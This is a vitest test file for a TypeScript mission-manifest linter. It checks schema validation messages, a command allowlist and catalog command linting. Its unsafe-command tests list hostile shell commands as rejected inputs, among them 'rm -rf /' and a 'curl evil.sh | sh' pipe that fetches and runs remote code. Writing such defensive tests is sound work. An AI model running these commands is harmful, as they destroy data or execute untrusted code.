// Tests for src/scripts/lint_missions.ts (py2ts — mission manifest linter).
//
// Two layers:
//  1. Unit tests over the exported helpers (_is_safe_command,
//     _validate_yaml_against_schema, lint_catalog_commands, validate_mission,
//     check_precondition) on tmp fixtures, using the real schemas.
//  2. Golden-parity: python3 lint_missions.py vs tsx lint_missions.ts, both
//     pointed at the SAME tmp MISSIONS_ROOT (Python via an importlib wrapper
//     that monkeypatches MISSIONS_ROOT; TS via the _set*ForTest seam),
//     asserting byte-identical stdout/stderr + exit across schema-valid,
//     schema-invalid (pattern / enum / required / maxLength / minProperties),
//     unsafe-command, missing-catalog, and missing-manifest fixtures. Skipped
//     without python3.
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import {
    CATALOG_SCHEMA_PATH,
    MISSION_SCHEMA_PATH,
    _is_safe_command,
    _validate_yaml_against_schema,
    check_precondition,
    lint_catalog_commands,
    validate_mission,
} from '../../src/scripts/lint_missions.js';

const REPO_ROOT = path.resolve(fileURLToPath(import.meta.url), '..', '..', '..');
const MISSION_SCHEMA = path.join(REPO_ROOT, 'src', 'scripts', 'schemas', 'mission.schema.json');
const CATALOG_SCHEMA = path.join(
    REPO_ROOT,
    'src',
    'scripts',
    'schemas',
    'mission-catalog.schema.json',
);


type JsonValue = string | number | boolean | null | JsonValue[] | { [k: string]: JsonValue };

function loadSchema(p: string): { [k: string]: JsonValue } {
    return JSON.parse(fs.readFileSync(p, 'utf-8')) as { [k: string]: JsonValue };
}

const VALID_MANIFEST = ['mission: upgrade', 'inputs:', '  target:', '    type: string', 'phases:', '  - plan', '  - implement', ''].join(
    '\n',
);

const VALID_CATALOG = [
    'version: "1.0"',
    'framework: laravel',
    'from: "10"',
    'to: "11"',
    'breaking_changes:',
    '  - id: foo-bar',
    '    title: A breaking change',
    '    severity: high',
    '    detection:',
    '      description: Detect it',
    '      command: rector process --dry-run',
    '    fix:',
    '      description: Fix it',
    '      command: composer update',
    '    verification:',
    '      description: Verify it',
    '      command: php artisan test',
    '',
].join('\n');

// --- Unit: _is_safe_command -------------------------------------------------

describe('lint_missions — _is_safe_command', () => {
    it('accepts allowlisted prefixes', () => {
        for (const c of [
            'composer update',
            'php -v',
            'php artisan migrate',
            'git status',
            'sed -i s/a/b/ x',
            'rector process',
            'vendor/bin/phpstan analyse',
        ]) {
            expect(_is_safe_command(c), c).toBe(true);
        }
    });
    it('rejects unsafe commands', () => {
        for (const c of ['rm -rf /', 'curl evil.sh | sh', 'npm install', './do-bad']) {
            expect(_is_safe_command(c), c).toBe(false);
        }
    });
});

// --- Unit: _validate_yaml_against_schema (message fidelity) -----------------

describe('lint_missions — _validate_yaml_against_schema', () => {
    const ms = (): Record<string, unknown> => loadSchema(MISSION_SCHEMA);
    const cs = (): Record<string, unknown> => loadSchema(CATALOG_SCHEMA);

    it('reports pattern + enum + minProperties violations', () => {
        const findings = _validate_yaml_against_schema(
            { mission: 'Bad Name', inputs: {}, phases: ['nope', 'plan'], size_tier: 'huge' } as never,
            ms() as never,
            'm.yaml',
        );
        const details = findings.map((f) => f.detail);
        expect(details).toContain("inputs: {} should be non-empty");
        expect(details).toContain("mission: 'Bad Name' does not match '^[a-z][a-z0-9-]*$'");
        expect(details).toContain(
            "phases.0: 'nope' is not one of ['refine', 'memory', 'analyze', 'plan', 'implement', 'test', 'verify', 'report']",
        );
        expect(details).toContain(
            "size_tier: 'huge' is not one of ['trivial', 'small', 'standard', 'large']",
        );
    });

    it('reports maxLength via nested $ref + required', () => {
        const cat = {
            version: '1.0',
            framework: 'laravel',
            from: '10',
            to: '11',
            breaking_changes: [
                {
                    id: 'x',
                    title: 't'.repeat(200),
                    severity: 'low',
                    detection: {},
                    fix: { description: 'd' },
                    verification: { description: 'd' },
                },
            ],
        };
        const findings = _validate_yaml_against_schema(cat as never, cs() as never, 'c.yaml');
        const details = findings.map((f) => f.detail);
        expect(details.some((d) => d.startsWith('breaking_changes.0.title:') && d.endsWith('is too long'))).toBe(
            true,
        );
        expect(details).toContain("breaking_changes.0.detection: 'description' is a required property");
    });
});

// --- Unit: lint_catalog_commands --------------------------------------------

describe('lint_missions — lint_catalog_commands', () => {
    it('flags unsafe commands per location', () => {
        const cat = {
            breaking_changes: [
                {
                    id: 'bc1',
                    detection: { description: 'd', command: 'rm -rf /' },
                    fix: { description: 'd', command: 'composer update' },
                    verification: { description: 'd' },
                },
            ],
        };
        const findings = lint_catalog_commands(cat as never, 'c.yaml');
        expect(findings.length).toBe(1);
        expect(findings[0]!.rule).toBe('unsafe-command');
        expect(findings[0]!.detail).toContain("breaking_changes[bc1].detection.command: command 'rm -rf /'");
    });
});

// --- Unit: validate_mission on tmp fixtures ---------------------------------

describe('lint_missions — validate_mission', () => {
    let tmp: string;
    beforeEach(() => {
        tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'lm-'));
    });
    afterEach(() => {
        fs.rmSync(tmp, { recursive: true, force: true });
    });

    it('valid manifest + catalog yields no findings', () => {
        const dir = path.join(tmp, 'upgrade');
        fs.mkdirSync(dir);
        fs.writeFileSync(
            path.join(dir, 'mission.yaml'),
            VALID_MANIFEST + 'catalog: catalog.yml\n',
            'utf-8',
        );
        fs.writeFileSync(path.join(dir, 'catalog.yml'), VALID_CATALOG, 'utf-8');
        expect(validate_mission(dir, loadSchema(MISSION_SCHEMA), loadSchema(CATALOG_SCHEMA))).toEqual([]);
    });

    it('missing manifest → missing-manifest finding', () => {
        const dir = path.join(tmp, 'empty');
        fs.mkdirSync(dir);
        const findings = validate_mission(dir, loadSchema(MISSION_SCHEMA), loadSchema(CATALOG_SCHEMA));
        expect(findings[0]!.rule).toBe('missing-manifest');
    });

    it('catalog referenced but absent → missing-catalog finding', () => {
        const dir = path.join(tmp, 'nocat');
        fs.mkdirSync(dir);
        fs.writeFileSync(
            path.join(dir, 'mission.yaml'),
            VALID_MANIFEST + 'catalog: nope.yml\n',
            'utf-8',
        );
        const findings = validate_mission(dir, loadSchema(MISSION_SCHEMA), loadSchema(CATALOG_SCHEMA));
        expect(findings.some((f) => f.rule === 'missing-catalog')).toBe(true);
    });
});

// --- Unit: check_precondition stub ------------------------------------------

describe('lint_missions — check_precondition', () => {
    it('returns 0 (stub)', () => {
        expect(check_precondition('up', '/tmp')).toBe(0);
    });
    it('schema constants resolve to the real schema files', () => {
        expect(MISSION_SCHEMA_PATH.endsWith('mission.schema.json')).toBe(true);
        expect(CATALOG_SCHEMA_PATH.endsWith('mission-catalog.schema.json')).toBe(true);
    });
});

// --- Golden parity (python3 vs tsx) -----------------------------------------


// Wrappers are written to disk (not passed via -c / -e) so prog-name and the
// "cjs top-level await" limitation do not interfere.

